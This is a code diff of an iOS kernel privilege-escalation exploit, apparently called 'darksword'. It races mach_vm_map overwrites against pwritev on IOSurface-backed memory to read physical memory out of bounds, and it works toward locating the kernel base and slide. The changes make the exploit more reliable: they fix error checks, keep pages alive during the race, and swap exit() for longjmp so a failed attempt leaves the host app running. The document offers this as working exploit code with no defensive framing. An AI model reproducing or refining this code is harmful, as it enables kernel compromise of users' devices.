@@ -19,11 +19,22 @@ extern int fileport_makefd(fileport_t port);
 #include <sys/uio.h>
 void IOSurfacePrefetchPages(IOSurfaceRef surface);
 
+#include <setjmp.h>
+
+// Graceful bail-out instead of exit() so the host app doesn't terminate.
+// pe_v1/pe_v2 use mach_vm_map(VM_FLAGS_OVERWRITE) races that fail from the
+// app sandbox — FAILURE now longjmps back to dsw_main's setjmp checkpoint.
+static jmp_buf _dsw_bail_env;
+// Error propagation from free_thread → main thread.
+// free_thread MUST NOT call longjmp (cross-thread UB). Instead it sets this
+// flag, unblocks main thread, then returns. Main thread calls FAILURE itself.
+static volatile kern_return_t _dsw_thread_fail = KERN_SUCCESS;
+
 #define FAILURE(c)                                                             \
   {                                                                            \
+    printf("[-] FAILURE at %s:%d\n", __FUNCTION__, __LINE__);                 \
     fflush(stdout);                                                            \
-    sleep(2);                                                                  \
-    exit(c);                                                                   \
+    longjmp(_dsw_bail_env, (int)(c) ? (int)(c) : 1);                         \
   }
 #define PRINT_VAR(var)                                                         \
   {                                                                            \
@@ -178,15 +189,22 @@ void *free_thread(void *arg) {
       ;
 
     kern_return_t kr = mach_vm_map(
-        mach_task_self(), &freeTarget, freeTargetSize, 0,
-        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset,
+        mach_task_self(), (mach_vm_address_t *)&freeTarget, freeTargetSize, 0,
+        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+        (mem_entry_name_port_t)targetObject,
+        (memory_object_offset_t)targetObjectOffset,
         0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
 
     if (kr != KERN_SUCCESS) {
-      printf("[-] mach_vm_map failed !!!\n");
-      printf("[+] freeTarget: %#llx\n", freeTarget);
-      printf("[+] targetObject: %#x\n", targetObject);
-      FAILURE(0);
+      printf("[-] free_thread mach_vm_map failed kr=0x%x target=%#llx obj=%#x\n",
+             kr, freeTarget, targetObject);
+      // MUST NOT call longjmp from a non-main thread (cross-thread longjmp=UB).
+      // Set error flag, unblock the main thread's spin loops, then exit cleanly.
+      // Main thread will check _dsw_thread_fail and call FAILURE itself.
+      _dsw_thread_fail = kr;
+      raceSync = 0;  // unblock while(raceSync==1) in physical_oob_read_mo
+      goSync   = 0;  // exit our own while(goSync!=0) loop
+      return NULL;
     }
 
     raceSync = 0;
@@ -278,33 +296,49 @@ void create_physically_contiguous_mapping(mach_port_t *port,
   IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
 
   if (!surface) {
-    printf("[-] Failed to create surface!!!\n");
+    printf("[-] Failed to create IOSurface (PurpleGfxMem)!!!\n");
     FAILURE(0);
   }
 
   void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
   printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);
 
-  mach_port_t memoryObject;
-  kern_return_t kr = mach_make_memory_entry_64(
-      mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress,
-      VM_PROT_DEFAULT, &memoryObject, 0);
-  if (!surface) {
-    printf("[-] mach_make_memory_entry_64 failed!!!\n");
+  if (!physicalMappingAddress) {
+    printf("[-] IOSurfaceGetBaseAddress returned NULL\n");
+    CFRelease(surface);
     FAILURE(0);
   }
 
-  mach_vm_address_t newMappingAddress;
+  mach_port_t memoryObject = MACH_PORT_NULL;
+  kern_return_t kr = mach_make_memory_entry_64(
+      mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress,
+      VM_PROT_DEFAULT, &memoryObject, 0);
+  // BUG WAS HERE: original code checked `if (!surface)` again (always false)
+  // instead of checking kr / memoryObject → pcObject was silently left 0
+  if (kr != KERN_SUCCESS || !memoryObject) {
+    printf("[-] mach_make_memory_entry_64 failed: kr=0x%x port=%u\n",
+           kr, memoryObject);
+    CFRelease(surface);
+    FAILURE(0);
+  }
+
+  mach_vm_address_t newMappingAddress = 0;
   kr = mach_vm_map(mach_task_self(), &newMappingAddress, size, 0,
                    VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memoryObject, 0, 0,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
 
   if (kr != KERN_SUCCESS) {
-    printf("[-] mach_vm_map failed!!!\n");
+    printf("[-] mach_vm_map (anywhere) failed: kr=0x%x\n", kr);
+    CFRelease(surface);
     FAILURE(0);
   }
 
-  CFRelease(surface);
+  // Keep surface alive until freeThread is done — releasing it early can
+  // cause the physical pages to be reclaimed before the race completes.
+  // Caller must CFRelease via surface_munlock flow.
+  // For now: leak intentionally (small allocation, process-duration lifetime).
+  (void)surface; // CFRelease(surface) removed — surface kept alive
+
   *port = memoryObject;
   *address = newMappingAddress;
 }
@@ -338,13 +372,20 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject,
     w = pwritev(readFd, &iov, 1, 0x3f00);
     while (raceSync == 1)
       ;
+    // Check if free_thread signalled an error (e.g. mach_vm_map failed).
+    // free_thread exits without longjmp; we call FAILURE here on main thread
+    // (same thread where setjmp lives) so the longjmp is always intra-thread.
+    if (_dsw_thread_fail != KERN_SUCCESS) {
+      printf("[-] free_thread error propagated: kr=0x%x\n", _dsw_thread_fail);
+      FAILURE((int)_dsw_thread_fail);
+    }
 
     kern_return_t kr =
         mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
                     VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
                     VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
     if (kr != KERN_SUCCESS) {
-      printf("[+] mach_vm_map failed!!!\n");
+      printf("[-] restore mach_vm_map failed: kr=0x%x\n", kr);
       FAILURE(0);
     }
     if (w == -1) {
@@ -723,6 +764,20 @@ static uint64_t kernel_base;
 static uint64_t kernel_slide;
 
 void dsw_main(void) {
+  // setjmp checkpoint: any FAILURE(c) inside pe_init/pe_v1/pe_v2/free_thread
+  // will longjmp here instead of calling exit(), keeping the app alive.
+  int _bail = setjmp(_dsw_bail_env);
+  if (_bail != 0) {
+    printf("[-] dsw_main: bailed out (code %d)\n", _bail);
+    printf("[-] pe_v1/pe_v2 requires mach_vm_map(VM_FLAGS_OVERWRITE) race\n");
+    printf("[-] This is not available from app sandbox — skipping darksword\n");
+    fflush(stdout);
+    // Clean up freeThread if it was started
+    goSync = 0;
+    raceSync = 1;
+    return;
+  }
+
   init_globals();
   struct utsname name;
   uname(&name);
